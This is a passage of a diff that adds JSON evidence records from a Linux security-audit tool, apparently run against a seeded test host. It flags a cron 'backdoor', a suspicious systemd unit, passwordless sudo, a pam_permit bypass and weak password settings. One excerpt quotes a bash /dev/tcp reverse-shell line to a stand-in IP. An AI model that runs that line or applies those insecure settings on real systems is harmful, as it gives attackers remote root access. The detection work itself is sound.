+   "provenance": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    }
+   ]
+  },
+  {
+   "id": "EV-0ddfdf1f81616380",
+   "type": "file",
+   "ref": "/etc/passwd",
+   "excerpts": [
+    "account 'daemon' has primary gid 1, which no group defines",
+    "account 'sync' has primary gid 65534, which no group defines",
+    "account 'www-data' has primary gid 33, which no group defines",
+    "account 'postgres' has primary gid 116, which no group defines",
+    "account 'bob' has primary gid 1001, which no group defines"
+   ],
+   "provenance": [
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-GROUP-003",
+     "collected_at": "2026-11-02T01:49:56Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "ba0b6171803bd83650050e1c7bc4ae135091c7e4b91008a3d01a993ab367a389"
+    },
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-INFO-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-UID0-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-DUPUID-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SHELL-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-GROUP-003",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-0fd3e2489323a778",
+   "type": "file",
+   "ref": "/etc/pam.d/login-bad",
+   "excerpts": [
+    "auth sufficient pam_permit.so accepts any user without a password check"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-PERMIT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-14452aca4417dc45",
+   "type": "file",
+   "ref": "/usr/bin/mystery",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-1c5f65266b72c4b4",
+   "type": "other",
+   "ref": "backup.service",
+   "excerpts": [
+    "failed/failed Nightly backup"
+   ],
+   "provenance": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-FAILED-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    }
+   ]
+  },
+  {
+   "id": "EV-21b17dfc00bde1fe",
+   "type": "file",
+   "ref": "/etc/pam.d/passwd",
+   "excerpts": [
+    "pam_unix password hashing uses a weak algorithm (md5)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-HASH-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-233e5c1fa2699bfd",
+   "type": "file",
+   "ref": "/home/twin/.keep",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-2489961555b9ad9a",
+   "type": "file",
+   "ref": "/tmp/.X11-unix/.keep",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-26fcd01cddd53c88",
+   "type": "file",
+   "ref": "/etc/systemd/system/ok.service",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-SYSTEMD-002",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-28246182ea92c14f",
+   "type": "file",
+   "ref": "/etc/sudoers.d/.keep",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-291bb06ae0e09de8",
+   "type": "network",
+   "ref": "udp 127.0.0.53:53",
+   "excerpts": [
+    "process systemd-resolve/5"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-2a793191d7eec6f9",
+   "type": "file",
+   "ref": "/root",
+   "excerpts": [
+    "mode 755"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-MODE-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-2afb152aabdb1680",
+   "type": "file",
+   "ref": "/etc/profile.d/x11.sh",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-2b4f9a2f60dff00b",
+   "type": "file",
+   "ref": "/usr/bin/su",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-2ef2c36d4a9fe361",
+   "type": "file",
+   "ref": "/etc/os-release",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.system",
+     "run_id": "06e047ce-017c-4c36-832c-60331b6c4182",
+     "check_id": "SYS-INFO-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "90b5aa4589ed0182e8e876e3b28940d54f0f20ea43e1ff911a45fd0f15e4a470"
+    }
+   ]
+  },
+  {
+   "id": "EV-2f7c336c08704d4a",
+   "type": "file",
+   "ref": "/var/log/journal",
+   "excerpts": [
+    "directory not found"
+   ],
+   "provenance": [
+    {
+     "module": "linux.sysconfig",
+     "run_id": "0ee0cdf1-7246-4a1d-863b-3dba078c6cf0",
+     "check_id": "CFG-LOG-003",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "453e1f306fb1c819b042d9d412464340225e4841e623c475db240b6913d12ef2"
+    }
+   ]
+  },
+  {
+   "id": "EV-32f5b3c0f0c4c3b3",
+   "type": "network",
+   "ref": "tcp *:6379",
+   "excerpts": [
+    "process redis-server/130",
+    "process redis-server/130; redis"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    },
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-EXPOSE-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-3b6d89e42c45b444",
+   "type": "file",
+   "ref": "/etc/crontab",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-CRON-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-3d4d98c42fba6a30",
+   "type": "file",
+   "ref": "/etc/cron.d/benign",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-CRON-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-3fa6bc1a6cd709b7",
+   "type": "file",
+   "ref": "/etc/shadow",
+   "excerpts": [
+    "account 'root': password never expires (max age 99999)",
+    "account 'alice': password never expires (max age 99999)",
+    "mode 644",
+    "account 'nopass' has an empty password field"
+   ],
+   "provenance": [
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-AGING-001",
+     "collected_at": "2026-11-02T01:49:56Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "ba0b6171803bd83650050e1c7bc4ae135091c7e4b91008a3d01a993ab367a389"
+    },
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-MODE-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-PWD-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-40f79d03e5075a82",
+   "type": "other",
+   "ref": "ssh.service",
+   "excerpts": [
+    "active/running OpenBSD Secure Shell server",
+    "enabled"
+   ],
+   "provenance": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-INFO-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    },
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-ENABLED-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    }
+   ]
+  },
+  {
+   "id": "EV-42399253813ea945",
+   "type": "file",
+   "ref": "/usr/bin/find",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-45ab82cd4100b0f7",
+   "type": "file",
+   "ref": "/etc/pam.d",
+   "provenance": [
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-PWQ-001",
+     "collected_at": "2026-11-02T01:49:56Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "ba0b6171803bd83650050e1c7bc4ae135091c7e4b91008a3d01a993ab367a389"
+    },
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-LOCKOUT-001",
+     "collected_at": "2026-11-02T01:49:56Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "ba0b6171803bd83650050e1c7bc4ae135091c7e4b91008a3d01a993ab367a389"
+    }
+   ]
+  },
+  {
+   "id": "EV-472caf3376e51809",
+   "type": "file",
+   "ref": "/lib/x86_64-linux-gnu/security/pam_nologin.so",
+   "excerpts": [
+    "modified within 3 day(s)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-4a4f9708f69bef13",
+   "type": "other",
+   "ref": "session",
+   "excerpts": [
+    "alice pts/0 2026-01-01 10:00 (203.0.113.50)",
+    "root tty1 2026-01-01 09:00"
+   ],
+   "provenance": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SESS-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-4c2c487e07287853",
+   "type": "process",
+   "ref": "pid=2",
+   "excerpts": [
+    "ppid=0 user=root comm=kthreadd exe=- cmd=-"
+   ],
+   "provenance": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    }
+   ]
+  },
+  {
+   "id": "EV-548ef692c82213e6",
+   "type": "file",
+   "ref": "/var/www/.keep",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-55dedfaa73a740fc",
+   "type": "file",
+   "ref": "/etc/systemd/system/evil.service",
+   "excerpts": [
+    "references world-writable directory: ExecStart=/tmp/.hidden/agent"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-SYSTEMD-002",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-SYSTEMD-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-5ecc51937ef84896",
+   "type": "file",
+   "ref": "/etc/hostname",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-61d3c8bc5107e60a",
+   "type": "file",
+   "ref": "/tmp/dropper",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-622a6e7f828e717a",
+   "type": "process",
+   "ref": "pid=300",
+   "excerpts": [
+    "ppid=200 user=alice comm=payload exe=/tmp/payload (deleted) cmd=/tmp/payload --password <redacted>",
+    "user=alice exe=/tmp/payload (deleted)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    },
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-DELETED-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    }
+   ]
+  },
+  {
+   "id": "EV-710df586f53cdad3",
+   "type": "file",
+   "ref": "/proc/sys/net/ipv4/ip_forward",
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-FWD-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-73c39801ab64b5df",
+   "type": "file",
+   "ref": "/etc/cron.d/backdoor",
+   "excerpts": [
+    "bash /dev/tcp redirect (reverse-shell pattern): */5 * * * * root bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-CRON-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-CRON-002",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-7441a29a4a9d17e7",
+   "type": "file",
+   "ref": "/etc/hosts",
+   "excerpts": [
+    "203.0.113.9 updates.example.test"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-HOSTS-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-7564a17e83d56988",
+   "type": "file",
+   "ref": "/etc/ld.so.preload",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-LDPRE-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-7c0cc50fe7f1d35f",
+   "type": "file",
+   "ref": "/etc/sudoers.d/90-ops",
+   "excerpts": [
+    "bob ALL=(ALL) NOPASSWD: ALL"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SUDO-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SUDO-002",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
